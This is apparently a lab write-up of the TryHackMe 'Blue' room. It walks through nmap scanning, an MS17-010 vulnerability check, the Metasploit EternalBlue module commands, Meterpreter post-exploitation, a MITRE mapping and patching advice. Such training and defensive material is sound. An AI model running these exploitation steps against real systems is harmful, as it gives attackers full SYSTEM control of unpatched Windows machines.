# Blue

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![Status](https://img.shields.io/badge/Status-Completed-success)

## Overview

**Blue** is an introductory Windows exploitation room on TryHackMe that focuses on exploiting the **MS17-010 (EternalBlue)** vulnerability. The room demonstrates how an attacker can move from reconnaissance to full SYSTEM-level access using Metasploit against a vulnerable Windows machine.

---

## Objectives

Throughout this room I learned how to:

- Enumerate a Windows target
- Identify open services
- Discover vulnerable SMB services
- Exploit MS17-010 (EternalBlue)
- Gain a Meterpreter shell
- Escalate to SYSTEM privileges
- Locate and retrieve flags

---

## Lab Environment

| Item | Value |
|-------|-------|
| Platform | TryHackMe |
| Operating System | Windows |
| Difficulty | Easy |
| Attack Vector | SMB (MS17-010) |
| Exploitation Framework | Metasploit |

---

# Phase 1 — Enumeration

The first step was identifying the services running on the target.

Using Nmap:

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

The scan revealed several Windows services.

| Port | Service |
|-------|----------|
|135|MSRPC|
|139|NetBIOS|
|445|SMB|
|3389|RDP|

The most interesting discovery was **SMB running on port 445**, since the room focuses on the EternalBlue vulnerability.

---

# Phase 2 — Vulnerability Assessment

To determine whether the machine was vulnerable, the SMB vulnerability detection script was executed.

```bash
nmap --script smb-vuln-ms17-010 -p445 <TARGET_IP>
```

The results confirmed that the machine was vulnerable to **MS17-010 (EternalBlue).**

At this point the target was ready for exploitation.

---

# Phase 3 — Exploitation

Metasploit Framework was launched.

```bash
msfconsole
```

The EternalBlue exploit module was searched.

```bash
search ms17-010
```

The appropriate exploit was selected.

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

The target IP address was configured.

```bash
set RHOSTS <TARGET_IP>
```

After verifying the configuration, the exploit was executed.

```bash
run
```

The exploit completed successfully and returned a Meterpreter session.

---

# Phase 4 — Post Exploitation

After obtaining Meterpreter access, several commands were used to verify the compromise.

Current user:

```bash
getuid
```

Operating system information:

```bash
sysinfo
```

Current directory:

```bash
pwd
```

Listing files:

```bash
ls
```

Changing directories:

```bash
cd
```

Reading files:

```bash
cat filename.txt
```

The compromised account had **NT AUTHORITY\SYSTEM** privileges, giving complete administrative access over the machine.

---

# Flags

All required flags were successfully located and submitted.

✅ User Flag

✅ Root Flag

---

# Attack Flow

Reconnaissance

↓

Port Scanning

↓

Service Enumeration

↓

SMB Vulnerability Detection

↓

MS17-010 Confirmed

↓

Metasploit Exploitation

↓

Meterpreter Session

↓

SYSTEM Access

↓

Capture Flags

---

# MITRE ATT&CK Mapping

| Tactic | Technique |
|---------|-----------|
| Discovery | Network Service Scanning (T1046) |
| Initial Access | Exploit Public-Facing Application (T1190) |
| Execution | Exploitation for Client Execution (T1203) |
| Privilege Escalation | Exploitation for Privilege Escalation (T1068) |
| Command and Control | Meterpreter Session |
| Impact | Full SYSTEM Access |

---

# Defensive Recommendations

To protect Windows systems against attacks like EternalBlue:

- Apply Microsoft's MS17-010 security update.
- Disable SMBv1 whenever possible.
- Restrict SMB exposure to trusted networks.
- Keep Windows systems fully patched.
- Segment internal networks.
- Continuously scan hosts for known vulnerabilities.
- Monitor SMB traffic for suspicious activity.

---

# Lessons Learned

This room demonstrated how dangerous unpatched systems can be. A single SMB vulnerability was enough to gain complete administrative control over the machine. It reinforced the importance of vulnerability scanning, patch management, and secure service configuration while also providing hands-on experience with Metasploit and Meterpreter.

---

# Screenshot

Place your completion screenshot here.

```text
Blue/
│
├── README.md
└── images
    └── blue-complete.png
```

```markdown
![Room Completion](images/blue-complete.png)
```

---

## Skills Demonstrated

- Windows Enumeration
- SMB Enumeration
- Nmap
- Vulnerability Assessment
- Metasploit
- Meterpreter
- Windows Privilege Escalation
- Post Exploitation
- MS17-010 (EternalBlue)
- Documentation

---

> **Disclaimer:** This walkthrough was completed within the TryHackMe platform for educational purposes only. All exploitation was performed against intentionally vulnerable machines in a controlled lab environment.
